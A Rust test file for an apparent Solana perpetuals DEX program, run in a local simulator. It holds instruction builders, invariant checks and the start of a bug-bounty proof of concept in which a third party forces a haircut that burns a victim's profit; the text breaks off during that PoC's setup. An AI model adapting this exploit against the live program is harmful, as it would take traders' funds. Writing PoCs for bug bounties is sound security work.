use litesvm::LiteSVM;
use solana_account::Account;
use solana_address::Address;
use solana_clock::Clock;
use solana_instruction::{AccountMeta, Instruction};
use solana_keypair::Keypair;
use solana_message::Message;
use solana_signer::Signer;
use solana_transaction::Transaction;

const TOKEN_PROGRAM_ID: Address =
    Address::from_str_const("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const SYSTEM_PROGRAM_ID: Address =
    Address::from_str_const("11111111111111111111111111111111");
const SPL_TOKEN_RENT_MIN: u64 = 2_039_280;

// Exact v2 layout constants matching Percolator/Layout.lean
const DEX_SIZE: usize = 200;
const MKT_SIZE: usize = 352;
const PFL_SIZE: usize = 952;
const INS_SIZE: usize = 88;
const MAX_LEGS: usize = 8;
const LEG_HEADER: usize = 120;
const LEG_STRIDE: usize = 104;
const POS_SCALE: u64 = 1_000_000;
const ADL_ONE: u64 = 1_000_000_000;

fn make_spl_mint(decimals: u8, supply: u64, mint_auth: &Address) -> Vec<u8> {
    let mut data = vec![0u8; 82];
    data[0..4].copy_from_slice(&1u32.to_le_bytes());
    data[4..36].copy_from_slice(mint_auth.as_ref());
    data[36..44].copy_from_slice(&supply.to_le_bytes());
    data[44] = decimals;
    data[45] = 1;
    data
}

fn make_spl_token_account(mint: &Address, owner: &Address, amount: u64) -> Vec<u8> {
    let mut data = vec![0u8; 165];
    data[0..32].copy_from_slice(mint.as_ref());
    data[32..64].copy_from_slice(owner.as_ref());
    data[64..72].copy_from_slice(&amount.to_le_bytes());
    data[108] = 1; // Initialized
    data
}

fn token_amount(svm: &LiteSVM, acc: &Address) -> u64 {
    let a = svm.get_account(acc).expect("token acc missing");
    u64::from_le_bytes(a.data[64..72].try_into().unwrap())
}

fn read_u32(svm: &LiteSVM, acc: &Address, off: usize) -> u32 {
    let a = svm.get_account(acc).unwrap();
    u32::from_le_bytes(a.data[off..off+4].try_into().unwrap())
}
fn read_u64(svm: &LiteSVM, acc: &Address, off: usize) -> u64 {
    let a = svm.get_account(acc).expect("acc missing");
    u64::from_le_bytes(a.data[off..off + 8].try_into().unwrap())
}

fn read_u8(svm: &LiteSVM, acc: &Address, off: usize) -> u8 {
    let a = svm.get_account(acc).expect("acc missing");
    a.data[off]
}

fn set_slot(svm: &mut LiteSVM, slot: u64) {
    let mut clock: Clock = svm.get_sysvar();
    clock.slot = slot;
    svm.set_sysvar(&clock);
    svm.expire_blockhash();
}

fn get_slot(svm: &LiteSVM) -> u64 {
    let clock: Clock = svm.get_sysvar();
    clock.slot
}

fn compact_u16_len(n: usize) -> usize {
    if n < 0x80 { 1 } else if n < 0x4000 { 2 } else { 3 }
}

/// Exact Solana legacy wire transaction byte length (must be <= 1,232 bytes for UDP MTU!).
fn legacy_tx_wire_bytes(tx: &Transaction) -> usize {
    let sigs = tx.signatures.len();
    let msg = &tx.message;
    let keys = msg.account_keys.len();
    let ixs = &msg.instructions;
    let mut len = compact_u16_len(sigs) + sigs * 64;
    len += 3; // MessageHeader
    len += compact_u16_len(keys) + keys * 32;
    len += 32; // recent_blockhash
    len += compact_u16_len(ixs.len());
    for ix in ixs {
        len += 1; // program_id_index
        len += compact_u16_len(ix.accounts.len()) + ix.accounts.len();
        len += compact_u16_len(ix.data.len()) + ix.data.len();
    }
    len
}

fn send_ixs_ok_measured(svm: &mut LiteSVM, ixs: &[Instruction], payer: &Keypair, signers: &[&Keypair]) -> (u64, usize) {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(ixs, Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    let wire = legacy_tx_wire_bytes(&tx);
    let res = svm.send_transaction(tx).unwrap_or_else(|e| panic!("Expected OK (wire={}B), got {:?}", wire, e));
    (res.compute_units_consumed, wire)
}

fn send_ixs_ok(svm: &mut LiteSVM, ixs: &[Instruction], payer: &Keypair, signers: &[&Keypair]) -> u64 {
    send_ixs_ok_measured(svm, ixs, payer, signers).0
}

fn send_ok(svm: &mut LiteSVM, ix: Instruction, payer: &Keypair, signers: &[&Keypair]) -> u64 {
    send_ixs_ok(svm, &[ix], payer, signers)
}

fn send_ok_assert_log(
    svm: &mut LiteSVM,
    ix: Instruction,
    payer: &Keypair,
    signers: &[&Keypair],
    expected_prefix: &str,
) -> u64 {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(&[ix], Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    let res = svm.send_transaction(tx).unwrap_or_else(|e| panic!("Expected OK, got {:?}", e));
    assert!(
        res.logs.iter().any(|l| l.contains(expected_prefix)),
        "Expected structured log containing '{}' in logs: {:?}",
        expected_prefix,
        res.logs
    );
    res.compute_units_consumed
}

fn send_ixs_err(svm: &mut LiteSVM, ixs: &[Instruction], payer: &Keypair, signers: &[&Keypair], label: &str) {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(ixs, Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    let res = svm.send_transaction(tx);
    assert!(res.is_err(), "Expected rejection for '{}', but tx succeeded!", label);
}

fn send_ixs_try(svm: &mut LiteSVM, ixs: &[Instruction], payer: &Keypair, signers: &[&Keypair]) -> Result<u64, String> {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(ixs, Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    svm.send_transaction(tx)
        .map(|r| r.compute_units_consumed)
        .map_err(|e| format!("{:?}", e))
}

fn send_err(svm: &mut LiteSVM, ix: Instruction, payer: &Keypair, signers: &[&Keypair], label: &str) {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(&[ix], Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    let res = svm.send_transaction(tx);
    assert!(res.is_err(), "Expected rejection for '{}', but tx succeeded!", label);
}

fn send_err_custom(
    svm: &mut LiteSVM,
    ix: Instruction,
    payer: &Keypair,
    signers: &[&Keypair],
    expected_code: u32,
    label: &str,
) {
    svm.expire_blockhash();
    let bh = svm.latest_blockhash();
    let msg = Message::new(&[ix], Some(&payer.pubkey()));
    let tx = Transaction::new(signers, msg, bh);
    let res = svm.send_transaction(tx);
    let err = res.expect_err(&format!(
        "Expected Custom({}) rejection for '{}', but tx SUCCEEDED!",
        expected_code, label
    ));
    let dbg = format!("{:?}", err);
    let needle = format!("Custom({})", expected_code);
    assert!(
        dbg.contains(&needle),
        "Expected {} for '{}', got: {}",
        needle,
        label,
        dbg
    );
}

fn create_prog_acc(svm: &mut LiteSVM, prog_id: &Address, size: usize) -> Address {
    let addr = Keypair::new().pubkey();
    svm.set_account(
        addr,
        Account {
            lamports: 10_000_000,
            data: vec![0u8; size],
            owner: *prog_id,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();
    addr
}

fn create_tok_acc(svm: &mut LiteSVM, mint: &Address, owner: &Address, amount: u64) -> Address {
    let addr = Keypair::new().pubkey();
    svm.set_account(
        addr,
        Account {
            lamports: 10_000_000,
            data: make_spl_token_account(mint, owner, amount),
            owner: TOKEN_PROGRAM_ID,
            executable: false,
            rent_epoch: 0,
        },
    )
    .unwrap();
    addr
}

/// Pure PDA derivation ONLY — does NOT mock or create the account!
/// `InitDex` itself creates & initializes the SPL Token vault account on-chain via CPI!
fn derive_dex_vault(prog_id: &Address, dex: &Address) -> (Address, u8) {
    Address::find_program_address(&[b"dvlt", dex.as_ref()], prog_id)
}

/// Global + per-market + per-portfolio EXACT invariant verifier!
fn assert_dex_invariants(
    svm: &LiteSVM,
    dex: &Address,
    dex_vault: &Address,
    markets: &[Address],
    portfolios: &[Address],
    label: &str,
) {
    let v = read_u64(svm, dex, 160);
    let c_tot = read_u64(svm, dex, 168);
    let i_tot = read_u64(svm, dex, 176);
    let r_tot = read_u64(svm, dex, 184);
    let s_tot = read_u64(svm, dex, 192);
    let spl = token_amount(svm, dex_vault);

    assert_eq!(v, spl, "[{}] Dex.vaultBalance ({}) != SPL balance ({})", label, v, spl);
    assert_eq!(
        c_tot as u128 + i_tot as u128 + r_tot as u128 + s_tot as u128,
        v as u128,
        "[{}] EXACT stock equality violated: C({}) + I({}) + R({}) + S({}) != V({})",
        label, c_tot, i_tot, r_tot, s_tot, v
    );

    let mut sum_i: u64 = 0;
    let mut sum_r: u64 = 0;
    let mut sum_s: u64 = 0;
    for m in markets {
        let r_m = read_u64(svm, m, 216);
        let i_m = read_u64(svm, m, 224);
        let s_m = read_u64(svm, m, 232);
        let oi_l = read_u64(svm, m, 256);
        let oi_s = read_u64(svm, m, 264);
        let raw_l = read_u64(svm, m, 272);
        let raw_s = read_u64(svm, m, 280);
        let adl_l = read_u64(svm, m, 288);
        let adl_s = read_u64(svm, m, 296);
        let max_oi = read_u64(svm, m, 208);

        assert_eq!(oi_l, oi_s, "[{}] Market OI imbalanced: {} != {}", label, oi_l, oi_s);
        assert!(oi_l <= max_oi, "[{}] Market OI {} > maxOi {}", label, oi_l, max_oi);
        assert!(oi_l <= raw_l, "[{}] oiLong {} > rawBasisLong {}", label, oi_l, raw_l);
        assert!(oi_s <= raw_s, "[{}] oiShort {} > rawBasisShort {}", label, oi_s, raw_s);
        assert!(adl_l <= ADL_ONE, "[{}] adlLong {} > ADL_ONE", label, adl_l);
        assert!(adl_s <= ADL_ONE, "[{}] adlShort {} > ADL_ONE", label, adl_s);
        sum_i += i_m;
        sum_r += r_m;
        sum_s += s_m;
    }
    assert_eq!(sum_i, i_tot, "[{}] Σ m.insurance ({}) != Dex.totalInsurance ({})", label, sum_i, i_tot);
    assert_eq!(sum_r, r_tot, "[{}] Σ m.realizedPool ({}) != Dex.totalResidual ({})", label, sum_r, r_tot);
    assert!(sum_s <= s_tot, "[{}] Σ m.feeSurplus ({}) > Dex.totalSurplus ({})", label, sum_s, s_tot);

    let mut sum_c: u64 = 0;
    for p in portfolios {
        let cap = read_u64(svm, p, 88);
        let tot_mm = read_u64(svm, p, 96);
        let tot_im = read_u64(svm, p, 104);
        let tot_res = read_u64(svm, p, 112);
        let leg_cnt = read_u8(svm, p, 4);
        let mut calc_mm: u64 = 0;
        let mut calc_im: u64 = 0;
        let mut calc_res: u64 = 0;
        let mut calc_cnt: u8 = 0;
        for idx in 0..MAX_LEGS {
            let base = LEG_HEADER + idx * LEG_STRIDE;
            if read_u8(svm, p, base) != 0 {
                let l_mm = read_u64(svm, p, base + 72);
                let l_im = read_u64(svm, p, base + 80);
                let l_res = read_u64(svm, p, base + 96);
                assert!(l_res <= l_mm, "[{}] Leg reservedMm ({}) > cachedMm ({})", label, l_res, l_mm);
                calc_cnt += 1;
                calc_mm += l_mm;
                calc_im += l_im;
                calc_res += l_res;
            }
        }
        assert_eq!(calc_mm, tot_mm, "[{}] Portfolio totalMm mismatch: calc {} != stored {}", label, calc_mm, tot_mm);
        assert_eq!(calc_im, tot_im, "[{}] Portfolio totalIm mismatch: calc {} != stored {}", label, calc_im, tot_im);
        assert_eq!(calc_res, tot_res, "[{}] Portfolio totalReservedMm mismatch: calc {} != stored {}", label, calc_res, tot_res);
        assert!(tot_res <= cap, "[{}] ANTI-SHIELDING VIOLATED: totalReservedMm ({}) > capital ({})", label, tot_res, cap);
        assert_eq!(calc_cnt, leg_cnt, "[{}] Portfolio legCount mismatch: calc {} != stored {}", label, calc_cnt, leg_cnt);
        sum_c += cap;
    }
    assert_eq!(sum_c, c_tot, "[{}] Σ pfl.capital ({}) != Dex.totalCapital ({})", label, sum_c, c_tot);
}

// ============================================================================
// Instruction Builders (19 Unified v2 Instructions)
// ============================================================================

fn ix_init_dex(
    prog: Address, dex: Address, admin: Address, mint: Address,
    vault_pda: Address, fee_vault: Address, tok_prog: Address, sys_prog: Address,
    bump: u8, decimals: u8, create_fee: u64, rent_lamports: u64,
) -> Instruction {
    let mut data = vec![0u8; 20];
    data[0] = 0;
    data[1] = bump;
    data[2] = decimals;
    data[4..12].copy_from_slice(&create_fee.to_le_bytes());
    data[12..20].copy_from_slice(&rent_lamports.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(admin, true),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(fee_vault, false),
            AccountMeta::new_readonly(tok_prog, false),
            AccountMeta::new_readonly(sys_prog, false),
        ],
        data,
    }
}

fn ix_update_create_fee(prog: Address, dex: Address, admin: Address, new_fee: u64, new_admin: Option<Address>) -> Instruction {
    let mut data = vec![0u8; 9];
    data[0] = 1;
    data[1..9].copy_from_slice(&new_fee.to_le_bytes());
    let mut accounts = vec![AccountMeta::new(dex, false), AccountMeta::new_readonly(admin, true)];
    if let Some(na) = new_admin {
        accounts.push(AccountMeta::new_readonly(na, false));
    }
    Instruction { program_id: prog, accounts, data }
}

#[allow(clippy::too_many_arguments)]
fn ix_create_market_ext(
    prog: Address, dex: Address, mkt: Address, mint: Address, oracle_auth: Address,
    creator: Address, creator_tok: Address, fee_vault: Address,
    init_price: u64, exit_window: u64, max_staleness: u64, warmup_slots: u64,
    im_bps: u64, mm_bps: u64, liq_fee_bps: u64, trade_fee_bps: u64,
    max_move_bps: u64, max_ins_draw_bps: u64, max_oi: u64, min_mm: u64,
) -> Instruction {
    let mut data = vec![0u8; 100];
    data[0] = 2;
    data[4..12].copy_from_slice(&init_price.to_le_bytes());
    data[12..20].copy_from_slice(&exit_window.to_le_bytes());
    data[20..28].copy_from_slice(&max_staleness.to_le_bytes());
    data[28..36].copy_from_slice(&warmup_slots.to_le_bytes());
    data[36..44].copy_from_slice(&im_bps.to_le_bytes());
    data[44..52].copy_from_slice(&mm_bps.to_le_bytes());
    data[52..60].copy_from_slice(&liq_fee_bps.to_le_bytes());
    data[60..68].copy_from_slice(&trade_fee_bps.to_le_bytes());
    data[68..76].copy_from_slice(&max_move_bps.to_le_bytes());
    data[76..84].copy_from_slice(&max_ins_draw_bps.to_le_bytes());
    data[84..92].copy_from_slice(&max_oi.to_le_bytes());
    data[92..100].copy_from_slice(&min_mm.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new_readonly(oracle_auth, false),
            AccountMeta::new_readonly(creator, true),
            AccountMeta::new(creator_tok, false),
            AccountMeta::new(fee_vault, false),
            AccountMeta::new_readonly(TOKEN_PROGRAM_ID, false),
        ],
        data,
    }
}

#[allow(clippy::too_many_arguments)]
fn ix_create_market(
    prog: Address, dex: Address, mkt: Address, mint: Address, oracle_auth: Address,
    creator: Address, creator_tok: Address, fee_vault: Address,
    init_price: u64, exit_window: u64, max_staleness: u64, warmup_slots: u64,
    im_bps: u64, mm_bps: u64, liq_fee_bps: u64, trade_fee_bps: u64,
    max_move_bps: u64, max_ins_draw_bps: u64, max_oi: u64,
) -> Instruction {
    ix_create_market_ext(prog, dex, mkt, mint, oracle_auth, creator, creator_tok, fee_vault,
        init_price, exit_window, max_staleness, warmup_slots, im_bps, mm_bps, liq_fee_bps,
        trade_fee_bps, max_move_bps, max_ins_draw_bps, max_oi, 0)
}

fn ix_burn_market_admin(prog: Address, mkt: Address, admin: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![AccountMeta::new(mkt, false), AccountMeta::new_readonly(admin, true)],
        data: vec![3, 0],
    }
}

fn ix_update_market_auth(prog: Address, mkt: Address, admin: Address, role: u8, new_key: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(mkt, false),
            AccountMeta::new_readonly(admin, true),
            AccountMeta::new_readonly(new_key, false),
        ],
        data: vec![3, role],
    }
}

fn ix_close_account(prog: Address, acc: Address, authority: Address, dest: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(acc, false),
            AccountMeta::new_readonly(authority, true),
            AccountMeta::new(dest, false),
        ],
        data: vec![19],
    }
}

#[allow(clippy::too_many_arguments)]
fn ix_liquidate_ext(
    prog: Address, dex: Address, mkt: Address, pfl: Address,
    liq_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address,
    mode: u8, req_qty: u64, takeover: Option<(Address, Address)>,
) -> Instruction {
    let mut data = vec![0u8; 10];
    data[0] = 12;
    data[1] = mode;
    data[2..10].copy_from_slice(&req_qty.to_le_bytes());
    let mut accounts = vec![
        AccountMeta::new(dex, false),
        AccountMeta::new(mkt, false),
        AccountMeta::new(pfl, false),
        AccountMeta::new(liq_tok, false),
        AccountMeta::new_readonly(mint, false),
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(tok_prog, false),
    ];
    if let Some((liq_pfl, liq_owner)) = takeover {
        accounts.push(AccountMeta::new(liq_pfl, false));
        accounts.push(AccountMeta::new_readonly(liq_owner, true));
    }
    Instruction { program_id: prog, accounts, data }
}

fn ix_update_oracle(prog: Address, mkt: Address, oracle_auth: Address, new_price: u64, fund_sign: u8, fund_e6: u64) -> Instruction {
    let mut data = vec![0u8; 18];
    data[0] = 4;
    data[1..9].copy_from_slice(&new_price.to_le_bytes());
    data[9] = fund_sign;
    data[10..18].copy_from_slice(&fund_e6.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![AccountMeta::new(mkt, false), AccountMeta::new_readonly(oracle_auth, true)],
        data,
    }
}

fn ix_init_portfolio(prog: Address, dex: Address, pfl: Address, owner: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(pfl, false),
            AccountMeta::new_readonly(owner, true),
        ],
        data: vec![5],
    }
}

fn ix_deposit_collateral(
    prog: Address, dex: Address, pfl: Address, owner: Address,
    owner_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address, amount: u64,
) -> Instruction {
    let mut data = vec![0u8; 9];
    data[0] = 6;
    data[1..9].copy_from_slice(&amount.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(pfl, false),
            AccountMeta::new_readonly(owner, true),
            AccountMeta::new(owner_tok, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(tok_prog, false),
        ],
        data,
    }
}

fn ix_withdraw_collateral(
    prog: Address, dex: Address, pfl: Address, owner: Address,
    dest_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address, amount: u64,
) -> Instruction {
    let mut data = vec![0u8; 9];
    data[0] = 7;
    data[1..9].copy_from_slice(&amount.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(pfl, false),
            AccountMeta::new_readonly(owner, true),
            AccountMeta::new(dest_tok, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(tok_prog, false),
        ],
        data,
    }
}

fn ix_deposit_insurance_ext(
    prog: Address, dex: Address, mkt: Address, receipt: Address, lp: Address,
    lp_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address, amount: u64, donate: bool,
) -> Instruction {
    let mut data = vec![0u8; 10];
    data[0] = 8;
    data[1..9].copy_from_slice(&amount.to_le_bytes());
    data[9] = if donate { 1 } else { 0 };
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(receipt, false),
            AccountMeta::new_readonly(lp, true),
            AccountMeta::new(lp_tok, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(tok_prog, false),
        ],
        data,
    }
}

fn ix_deposit_insurance(
    prog: Address, dex: Address, mkt: Address, receipt: Address, lp: Address,
    lp_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address, amount: u64,
) -> Instruction {
    ix_deposit_insurance_ext(prog, dex, mkt, receipt, lp, lp_tok, mint, vault_pda, tok_prog, amount, false)
}

fn ix_withdraw_insurance(
    prog: Address, dex: Address, mkt: Address, receipt: Address, lp: Address,
    dest_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address, burn_shares: u64,
) -> Instruction {
    let mut data = vec![0u8; 9];
    data[0] = 9;
    data[1..9].copy_from_slice(&burn_shares.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(receipt, false),
            AccountMeta::new_readonly(lp, true),
            AccountMeta::new(dest_tok, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(tok_prog, false),
        ],
        data,
    }
}

fn ix_refresh_leg(prog: Address, dex: Address, mkt: Address, pfl: Address, force_haircut: bool) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl, false),
        ],
        data: vec![10, if force_haircut { 1 } else { 0 }],
    }
}

fn ix_trade_ext(
    prog: Address, dex: Address, mkt: Address,
    pfl_l: Address, owner_l: Address, pfl_s: Address, owner_s: Address,
    mode: u8, qty: u64, exec_price: u64,
) -> Instruction {
    let mut data = vec![0u8; 18];
    data[0] = 11;
    data[1] = mode;
    data[2..10].copy_from_slice(&qty.to_le_bytes());
    data[10..18].copy_from_slice(&exec_price.to_le_bytes());
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl_l, false),
            AccountMeta::new_readonly(owner_l, true),
            AccountMeta::new(pfl_s, false),
            AccountMeta::new_readonly(owner_s, true),
        ],
        data,
    }
}

fn ix_trade(
    prog: Address, dex: Address, mkt: Address,
    pfl_l: Address, owner_l: Address, pfl_s: Address, owner_s: Address,
    mode: u8, qty: u64,
) -> Instruction {
    ix_trade_ext(prog, dex, mkt, pfl_l, owner_l, pfl_s, owner_s, mode, qty, 0)
}

fn ix_liquidate(
    prog: Address, dex: Address, mkt: Address, pfl: Address,
    liq_tok: Address, mint: Address, vault_pda: Address, tok_prog: Address,
) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl, false),
            AccountMeta::new(liq_tok, false),
            AccountMeta::new_readonly(mint, false),
            AccountMeta::new(vault_pda, false),
            AccountMeta::new_readonly(tok_prog, false),
        ],
        data: vec![12],
    }
}

fn ix_clear_dead_leg(prog: Address, dex: Address, mkt: Address, pfl: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl, false),
        ],
        data: vec![13],
    }
}

fn ix_start_wind_down(prog: Address, mkt: Address, caller: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![AccountMeta::new(mkt, false), AccountMeta::new_readonly(caller, true)],
        data: vec![14],
    }
}

fn ix_force_close_pair(prog: Address, dex: Address, mkt: Address, pfl_l: Address, pfl_s: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl_l, false),
            AccountMeta::new(pfl_s, false),
        ],
        data: vec![15],
    }
}

fn ix_resolve_market(prog: Address, dex: Address, mkt: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![AccountMeta::new(dex, false), AccountMeta::new(mkt, false)],
        data: vec![16],
    }
}

fn ix_claim_resolved(prog: Address, dex: Address, mkt: Address, pfl: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![
            AccountMeta::new(dex, false),
            AccountMeta::new(mkt, false),
            AccountMeta::new(pfl, false),
        ],
        data: vec![17],
    }
}

fn ix_tombstone_market(prog: Address, mkt: Address) -> Instruction {
    Instruction {
        program_id: prog,
        accounts: vec![AccountMeta::new(mkt, false)],
        data: vec![18],
    }
}

/// Build `RefreshLeg` instructions for every active open leg of `pfl` in `markets_by_id`.
fn refresh_open_legs_ixs(
    svm: &LiteSVM,
    prog: Address,
    dex: Address,
    pfl: Address,
    markets: &[(u64, Address)],
) -> Vec<Instruction> {
    let mut ixs = Vec::new();
    for idx in 0..MAX_LEGS {
        let base = LEG_HEADER + idx * LEG_STRIDE;
        if read_u8(svm, &pfl, base) != 0 && read_u8(svm, &pfl, base + 1) != 0 {
            let mid = read_u64(svm, &pfl, base + 8);
            if let Some((_, mkt)) = markets.iter().find(|(id, _)| *id == mid) {
                ixs.push(ix_refresh_leg(prog, dex, *mkt, pfl, false));
            }
        }
    }
    ixs
}

/// Deterministic xorshift64 PRNG for reproducible 1,000-step stateful fuzzing.
struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        let mut x = self.0;
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        self.0 = x;
        x
    }
    fn range(&mut self, n: u64) -> u64 {
        if n == 0 { 0 } else { self.next() % n }
    }
}


// ============================ BOUNTY PoCs (read-only, local LiteSVM) ============================
const M_REALIZED: usize = 216; const M_INS: usize = 224; const M_TOTPNL: usize = 240; const M_TOTSH: usize = 248;
const M_OIL: usize = 256; const M_OIS: usize = 264; const M_RL: usize = 272; const M_RS: usize = 280;
const P_CAP: usize = 88;
const LEG0_POSPNL: usize = LEG_HEADER + 64;

struct Env { svm: LiteSVM, prog: Address, payer: Keypair, dex: Address, vault: Address, mint: Address, mint_auth: Keypair, fee_vault: Address }

fn setup(elf: &[u8]) -> Env {
    let mut svm = LiteSVM::new();
    let prog = Keypair::new().pubkey();
    svm.add_program(prog, elf).expect("ELF load failed");
    set_slot(&mut svm, 100);
    let payer = Keypair::new(); svm.airdrop(&payer.pubkey(), 100_000_000_000).unwrap();
    let mint_auth = Keypair::new(); svm.airdrop(&mint_auth.pubkey(), 10_000_000_000).unwrap();
    let mint = Keypair::new().pubkey();
    svm.set_account(mint, Account { lamports: 10_000_000, data: make_spl_mint(6, 10_000_000_000_000, &mint_auth.pubkey()), owner: TOKEN_PROGRAM_ID, executable: false, rent_epoch: 0 }).unwrap();
    let fee_vault = create_tok_acc(&mut svm, &mint, &mint_auth.pubkey(), 0);
    let dex = create_prog_acc(&mut svm, &prog, DEX_SIZE);
    let (vault, bump) = derive_dex_vault(&prog, &dex);
    send_ok(&mut svm, ix_init_dex(prog, dex, mint_auth.pubkey(), mint, vault, fee_vault, TOKEN_PROGRAM_ID, SYSTEM_PROGRAM_ID, bump, 6, 0, SPL_TOKEN_RENT_MIN), &payer, &[&payer, &mint_auth]);
    Env { svm, prog, payer, dex, vault, mint, mint_auth, fee_vault }
}

struct User { kp: Keypair, tok: Address, pfl: Address }

fn user(e: &mut Env, deposit: u64) -> User {
    let kp = Keypair::new(); e.svm.airdrop(&kp.pubkey(), 10_000_000_000).unwrap();
    let tok = create_tok_acc(&mut e.svm, &e.mint, &kp.pubkey(), 100_000 * POS_SCALE);
    let pfl = create_prog_acc(&mut e.svm, &e.prog, PFL_SIZE);
    send_ok(&mut e.svm, ix_init_portfolio(e.prog, e.dex, pfl, kp.pubkey()), &e.payer, &[&e.payer, &kp]);
    if deposit > 0 {
        send_ok(&mut e.svm, ix_deposit_collateral(e.prog, e.dex, pfl, kp.pubkey(), tok, e.mint, e.vault, TOKEN_PROGRAM_ID, deposit), &e.payer, &[&e.payer, &kp]);
    }
    User { kp, tok, pfl }
}

fn market(e: &mut Env, creator: &User, oracle: &Keypair, max_ins_draw_bps: u64) -> Address {
    let mkt = create_prog_acc(&mut e.svm, &e.prog, MKT_SIZE);
    // price 100, exitWindow 20, staleness 50, warmup 0, IM 10%, MM 5%, liqFee 1%, tradeFee 0, maxMove 4%
    send_ok(&mut e.svm, ix_create_market(e.prog, e.dex, mkt, e.mint, oracle.pubkey(), creator.kp.pubkey(), creator.tok, e.fee_vault,
        100 * POS_SCALE, 20, 50, 0, 1000, 500, 100, 0, 400, max_ins_draw_bps, 1_000_000 * POS_SCALE), &e.payer, &[&e.payer, &creator.kp]);
    mkt
}

fn trade_open(e: &mut Env, mkt: Address, l: &User, s: &User, qty: u64) {
    send_ok(&mut e.svm, ix_trade(e.prog, e.dex, mkt, l.pfl, l.kp.pubkey(), s.pfl, s.kp.pubkey(), 0, qty), &e.payer, &[&e.payer, &l.kp, &s.kp]);
}
fn oracle(e: &mut Env, mkt: Address, o: &Keypair, price: u64) {
    send_ok(&mut e.svm, ix_update_oracle(e.prog, mkt, o.pubkey(), price, 0, 0), &e.payer, &[&e.payer, o]);
}
fn refresh(e: &mut Env, mkt: Address, pfl: Address, force: bool) {
    // NOTE: signed ONLY by the fee payer (an unrelated third party) — no portfolio owner signature.
    send_ok(&mut e.svm, ix_refresh_leg(e.prog, e.dex, mkt, pfl, force), &e.payer, &[&e.payer]);
}
fn cap(e: &Env, p: &User) -> u64 { read_u64(&e.svm, &p.pfl, P_CAP) }
fn usd(x: u64) -> String { format!("{}.{:06}", x / POS_SCALE, x % POS_SCALE) }

/// PoC 1: permissionless forceHaircut burns a winner's profit while losers are still unsettled.
fn poc_force_haircut(elf: &[u8], attack: bool) -> (u64, u64, u64) {
    let mut e = setup(elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let creator = user(&mut e, 0);
    let mkt = market(&mut e, &creator, &o, 2500);
    let victim = user(&mut e, 1_000 * POS_SCALE);   // long 1 unit
    let bob    = user(&mut e, 1_000 * POS_SCALE);   // short 1 unit (honest counterparty)
    let att_l  = user(&mut e, 1_000 * POS_SCALE);   // attacker long 1 unit
    let att_s  = user(&mut e, 1_000 * POS_SCALE);   // attacker short 1 unit (wash counterparty)
